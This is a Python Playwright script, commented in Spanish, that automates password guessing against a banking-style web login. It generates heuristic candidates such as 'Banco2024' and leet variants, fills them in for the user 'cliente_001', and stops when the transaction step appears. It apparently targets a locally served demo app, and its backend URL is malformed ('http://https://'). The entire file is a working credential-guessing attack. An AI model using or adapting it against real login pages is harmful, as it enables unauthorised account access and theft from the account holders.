import asyncio
from playwright.async_api import async_playwright

# 1. Dirección del HTML en el navegador (Live Server / Frontend)
HTML_URL = "http://127.0.0.1:5500/index.html"  # Revisa el puerto de tu Live Server

# 2. Dirección de la API en Python (Backend)
BACKEND_URL = "http://https://statue-essential-dirtiness.ngrok-free.dev"

TARGET_USER = "cliente_001"

# Generación heurística de contraseñas
CONTEXT_KEYWORDS = ["Banco", "Secure"]
YEARS = ["2024", "2026"]
SYMBOLS = ["$", "#"]

def generate_passwords():
    generated = set()
    for base in CONTEXT_KEYWORDS:
        for yr in YEARS:
            for sym in SYMBOLS:
                leet = base.replace('e', '3').replace('s', '$')
                generated.add(f"{base}{yr}")
                generated.add(f"{leet}{sym}{yr}")
                generated.add(f"Banco$ecure#{yr}")
    return list(generated)

async def run_gui_bot():
    candidates = generate_passwords()
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False, slow_mo=100)
        page = await browser.new_page()

        print("🤖 [BOT] Cargando interfaz visual...")
        await page.goto(HTML_URL)

        # --- PASO CRÍTICO: Configurar la URL del Backend en la UI ---
        # Si el input tiene ID o placeholder, lo llenamos para asegurar la conexión
        backend_input = page.locator("input[value*='localhost'], #backendUrl, input[placeholder*='8000']").first
        if await backend_input.is_visible():
            await backend_input.fill(BACKEND_URL)
            print(f"🔗 URL del backend vinculada en la UI: {BACKEND_URL}")

        # Bucle de ataques heurísticos en la interfaz
        for attempt, pwd in enumerate(candidates, 1):
            print(f"🤖 Intento {attempt}: Probando '{pwd}'...")

            # Completa campos de login
            await page.fill("#username", TARGET_USER)
            await page.fill("#password", pwd)

            # Clic en "Iniciar sesión"
            await page.click("button:has-text('Iniciar sesión'), #btnLogin")

            await page.wait_for_timeout(1000)

            # Si pasa al PASO 2 (transacción), la contraseña fue exitosa
            if await page.is_visible("#viewTxn, text='PASO 2'"):
                print(f"✅ ¡Login exitoso en la UI! Contraseña: '{pwd}'")
                await page.wait_for_timeout(3000)
                await browser.close()
                return

        print("❌ Ninguna contraseña funcionó.")
        await browser.close()

if __name__ == "__main__":
    asyncio.run(run_gui_bot())